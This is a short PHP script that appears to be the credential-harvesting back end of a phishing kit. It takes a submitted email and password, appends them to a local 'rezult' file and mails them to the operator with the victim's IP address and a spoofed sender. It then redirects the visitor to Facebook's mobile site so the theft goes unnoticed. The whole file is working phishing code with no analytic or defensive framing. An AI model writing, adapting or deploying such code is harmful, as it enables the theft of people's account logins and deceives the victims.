<?php
@session_start();
@error_reporting(0);
include("system.php");
$email = $_SESSION['email'] = $_POST['email'];
$pass = $_SESSION['pass'] = $_POST['pass'] ;
$_SESSION['country'] = $country   = $details->country;
$messege = '<HR>
<span style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;"> '.$_SESSION["email"].' </span>
<span style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;"> : </span>
<span style="font-family:Segoe UI, Arial, sans-serif; font-weight: 400; margin: 10px 0;"> '.$_SESSION["pass"].' </span>

</div></body></html>';


include("../YOUR_EMAIL.php"); 
$f = fopen("../Rezult/rezult.php", "a");fwrite($f, $messege);
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers.="MIME-Version: 1.0\r\n";
$subject  = "Account By Ljazzar [".$_SERVER['REMOTE_ADDR']."] ";
$headers .= "From: New Account <info@admin-rezult.com>" . "\r\n";
mail($yourmail, $subject, $messege, $headers);
header("location: https://m.facebook.com/");

?>